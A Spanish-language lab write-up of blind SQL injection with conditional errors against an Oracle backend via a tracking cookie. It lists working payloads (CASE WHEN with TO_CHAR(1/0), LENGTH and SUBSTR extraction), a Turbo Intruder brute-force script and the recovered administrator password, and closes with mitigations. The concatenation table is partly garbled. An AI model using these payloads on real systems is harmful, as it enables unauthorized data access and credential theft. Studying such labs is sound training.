---
title: "Inyección SQL ciega con errores condicionales"
platform: "HackTheBox"
os: "Linux"
difficulty: "Insane"
ip: "10.10.10.XXX"
slug: "inyeccion-sql-ciega-con-errores-condicionales"
author: "Z4k7"
date: "2026-03-12"
year: "2026"
status: "pwned"
tags:
  - "SQLi"
  - "UnionAttack"
  - "BlindSQLi"
  - "cookie"
  - "Concatenar"
  - "Oracle"
  - "Database"
  - "Payload"
techniques:
  - "SQLi"
  - "UnionAttack"
  - "BlindSQLi"
  - "cookie"
  - "Concatenar"
tools:
  - "Burpsuite"
  - "Turbo-Intruder"
  - "Python"
flags_list:
  - label: "administrador"
    value: "administrator"
  - label: "password"
    value: "0ripns1j93ikxdgg23m"
summary: "La inyección SQL ciega basada en errores ocurre cuando una aplicación web ejecuta consultas SQL con datos no validados y no devuelve resultados directos, pero sí expone diferencias en el comportamiento (errores, tiempos de respuesta, códigos HTTP).   En este caso, la vulnerabilidad existe porque el valor de la cookie de tracking es concatenado directamente en la consulta SQL sin sanitización, permitiendo manipular la lógica de la base de datos."
steps:

  - id: "exploit"
    num: "01"
    title: "Objetivo"
    content:
      - kind: "note"
        text: |
          Este laboratorio contiene una vulnerabilidad de inyección SQL ciega. La aplicación utiliza una #cookie de seguimiento para análisis y realiza una consulta SQL que contiene el valor de la cookie enviada.
          Los resultados de la consulta SQL no se devuelven y la aplicación no responde de forma diferente según si la consulta devuelve filas o no. Si la consulta SQL genera un error, la aplicación devuelve un mensaje de error personalizado.
          La base de datos contiene una tabla diferente llamada `users`, con columnas llamadas `username` y `password`. Debes explotar la vulnerabilidad de inyección SQL ciega para averiguar la contraseña del `administrator`usuario.
          Para resolver el laboratorio, inicie sesión como `administrator`usuario.

  - id: "recon"
    num: "02"
    title: "Reconocimiento"
    content:
      - kind: "note"
        text: |
          Ingresamos en el laboratorio e identificamos la cookie por medio de burpsuite
      - kind: "image"
        src: "assets/images/Inyección%20SQL%20ciega%20con%20errores%20condicionales/file-20260312112204224.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Tratamos de enviar la validación del cookie para confirmas si nos puede brindar algún error o información

  - id: "exploit"
    num: "03"
    title: "Explotación"
    content:
      - kind: "note"
        text: |
          Como lo que queremos es trae el error lo mejor seria #Concatenar  La consulta según la pista del laboratorio es in #Oracle
      - kind: "code"
        lang: "SQL"
        code: |
          Cookie: TrackingId=aPeeitcEWYPNM70M'--; session=uoy0rMCY9vnYm49GWGsXBTsftkRPbpeA
          HTTP/2 200 OK
          Content-Type: text/html; charset=utf-8
          X-Frame-Options: SAMEORIGIN
          Content-Length: 1141
      - kind: "note"
        text: |
          si pasamos el '-- tendemos un status 200 pero lo que requerimos es generar error pasando solo una  ' sala error
      - kind: "code"
        lang: "SQL"
        code: |
          Cookie: TrackingId=aPeeitcEWYPNM70M'; session=uoy0rMCY9vnYm49GWGsXBTsftkRPbpeA
          HTTP/2 500 Internal Server Error
          Content-Type: text/html; charset=utf-8
          X-Frame-Options: SAMEORIGIN
          Content-Length: 2330
      - kind: "note"
        text: |
          Con lo anterior podemos validar que es vulnerable en este caso pasamos a realizar la concatenación mayor información en el apartado de información
          Primeros se confirma si la #Database  es Oracle con el siguiente codigo
      - kind: "code"
        lang: "SQL"
        code: |
          Cookie: TrackingId=aPeeitcEWYPNM70M'||(SELECT'')||'; session=uoy0rMCY9vnYm49GWGsXBTsftkRPbpeA
          HTTP/2 500 Internal Server Error
          Content-Type: text/html; charset=utf-8
      - kind: "note"
        text: |
          Nos salta el error ya que si recordamos para la base de Oracle se requiere  el FROM  + tabla en este caso una tabla predeterminada de oracle es el `dual`
          Enviando el concepto anterior se confirma que si es un ORACLE
          `Cookie: TrackingId=aPeeitcEWYPNM70M'||(SELECT'' FROM dual)||'; session=uoy0rMCY9vnYm49GWGsXBTsftkRPbpeA`
          Ya contamos  con la confirmación que es un Oracle solo nos queda validar y generar el error en este caso realizamos el concepto de errores
      - kind: "code"
        lang: "SQL"
        code: |
          SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual
      - kind: "note"
        text: |
          Si enviamos esta información nos envía un STATUS 500
      - kind: "code"
        lang: "SQL"
        code: |
          Cookie: TrackingId=aPeeitcEWYPNM70M'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'; session=uoy0rMCY9vnYm49GWGsXBTsftkRPbpeA
      - kind: "note"
        text: |
          Pero si realizo el envió de un erro de calculo da un STATUS 2OO
      - kind: "code"
        lang: "SQL"
        code: |
          Cookie: TrackingId=aPeeitcEWYPNM70M'||(SELECT CASE WHEN (2=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'; session=uoy0rMCY9vnYm49GWGsXBTsftkRPbpeA
      - kind: "note"
        text: |
          Validamos si existe la tabla que mencionan en el laboratorio
      - kind: "code"
        lang: "SQL"
        code: |
          `'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
      - kind: "note"
        text: |
          Como es validar por medio del error cuando se confirma el error nos da el ok que si contamos con la tabla status 500  si existe una tabla llamada  administrador
          Para validar la longitud del password validamos por medio de la sentencia SQL  `LENGTH` adicional en el apartado de la observación dl laboratorio nos menciona el usuario a consultar  en este caso seria  `administrator` si enviamos esto por medio de la consulta seria de la siguiente manera
      - kind: "code"
        lang: "SQL"
        code: |
          Cookie: TrackingId=yMeKzH5d1nzfJ0Ut'||(SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
      - kind: "note"
        text: |
          Enviamos el reporte por medio de intrude
          Confirmamos que contamos con 20 caracteres en  el password
      - kind: "image"
        src: "assets/images/Inyección%20SQL%20ciega%20con%20errores%20condicionales/file-20260312120800365.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Validamos si es posible realizar el mismo proceso por medio de turbo intrude
      - kind: "image"
        src: "assets/images/Inyección%20SQL%20ciega%20con%20errores%20condicionales/file-20260312121149695.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          En este caso ya conocemos el apartado de la longitud del password seria validar los caracteres del password el proceso lo realizamos por medio de turbo  intrudec por medio del apartado de intruder se demora un tiempo ya que no contamos con una licencia en burpsuite
          #Payload de sqli
      - kind: "code"
        lang: "SQL"
        code: |
          '||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
      - kind: "note"
        text: |
          Código a utilizar por parte de turbo intrude
      - kind: "code"
        lang: "PYTHON"
        code: |
          def queueRequests(target, wordlists):
              engine = RequestEngine(endpoint=target.endpoint,
                                     concurrentConnections=2,
                                     requestsPerConnection=20,
                                     pipeline=False)
          
              for numero in range(1, 25):
                  
                  # 2. Por cada número, abrimos y recorremos el diccionario abc.txt
                  # Es importante abrirlo dentro para que el puntero se reinicie
                  with open('C:\\Users\\Public\\abc.txt') as f:
                      for word in f:
                          word = word.rstrip()
                          
                          # 3. Enviamos ambos valores como una lista
                          # Tu solicitud (target.req) DEBE tener dos marcadores %s
                          engine.queue(target.req, [str(numero), word])
          
          def handleResponse(req, interesting):
              if req.status != 200:
                  table.add(req)
      - kind: "note"
        text: |
          Contamos con la validación del password para el acceso
      - kind: "image"
        src: "assets/images/Inyección%20SQL%20ciega%20con%20errores%20condicionales/file-20260312130320941.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Credenciales obtenidas:

  - id: "flag_01"
    type: "flag"
    flag_items:
      - label: "administrador"
        value: "administrator"
      - label: "password"
        value: "0ripns1j93ikxdgg23m"

  - id: "flag_01_post"
    num: ""
    title: "Post Flag"
    content:
      - kind: "note"
        text: |
          Se confirma el acceso a la web como usuario administrator
      - kind: "image"
        src: "assets/images/Inyección%20SQL%20ciega%20con%20errores%20condicionales/file-20260312132254499.jpg"
        caption: "Evidencia técnica"

  - id: "step4"
    num: "04"
    title: "Información"
    content:
      - kind: "note"
        text: |
          Para recuperar mutiles resultados en solo una consulta   podremos aplicar  el filtro de comparación en este caso  `|| '~' ||`  A continuación se emplea una comparación del código de la consulta  loanterior es una iopcionpara concatenar los datros pero no funcioan para todos los motores
      - kind: "table"
        headers:
          - "BD"
          - "Concatenacion"
        rows:
          - ["Orácle", "'foo'\", "\", "'bar'"]
          - ["Microsoft", "'foo'+'bar'"]
          - ["PostgreSQL", "'foo'\", "\", "'bar'"]
          - ["MySQL", "'foo' 'bar' ==Tenga en cuenta el espacio entre las dos cadenas==<br>CONCAT('foo','bar')"]
      - kind: "note"
        text: |
          La tabla anterior son las opciones que se utilizan para concatenar dependiendo del motor de BD que se usa

lessons:
  - 'En auditorías, siempre validar primero la existencia de tablas y usuarios antes de intentar extracción de datos sensibles.'
  - 'En exámenes o entrevistas, destacar la diferencia entre SQLi clásica (con errores visibles) y SQLi ciega (basada en inferencias).'
  - 'Recordar que la explotación se basa en respuestas booleanas y que la defensa más sólida es la parametrización.'
mitigation:
  - 'Implementar consultas parametrizadas (Prepared Statements).'
  - 'Evitar concatenación de valores de cookies en SQL.'
  - 'Monitorear patrones de requests repetitivos (detección de brute-force).'
  - 'Configurar WAF para bloquear payloads comunes de SQLi.'
  - 'Revisar logs de aplicación para detectar anomalías en cookies.'
---
